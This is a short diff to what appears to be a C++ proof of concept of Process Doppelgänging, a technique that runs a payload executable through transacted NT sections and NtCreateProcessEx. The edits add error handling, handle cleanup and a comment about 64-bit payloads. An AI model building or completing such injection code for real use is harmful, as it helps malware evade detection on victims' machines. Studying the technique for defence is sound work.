@@ -9,7 +9,7 @@
 #define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
 
 LPCWSTR target = L"C:\\doppelganger.exe";
-LPCWSTR payload = L"C:\\payload.exe";
+LPCWSTR payload = L"C:\\payload.exe";  // 64 bit image for 64 bit systems
 NTCREATESECTION NtCreateSection = nullptr;
 NTCREATEPROCESSEX NtCreateProcessEx = nullptr;
 NTQUERYINFORMATIONPROCESS NtQueryInfoProcess = nullptr;
@@ -61,7 +61,8 @@ LPVOID copy_payload(DWORD& buffersize)
 		std::cout << "ReadFile Failed" << std::endl;
 		return nullptr;
 	}
-
+	
+	CloseHandle(payloadfile);
 	return buffer;
 }
 
@@ -364,7 +365,17 @@ int main()
 		return 1;
 	}
 
-	NtResumeThread(hThread, NULL);
+	if(!NT_SUCCESS(NtResumeThread(hThread, NULL)))
+	{
+		std::cout << "NtResumeThread Failed" << std::endl;
+		system("pause");
+		return 1;
+	}
 
+	CloseHandle(hTransact);
+	CloseHandle(hFile);
+	CloseHandle(hSection);
+	CloseHandle(hProcess);
+	CloseHandle(hThread);
 	return 0;
 }
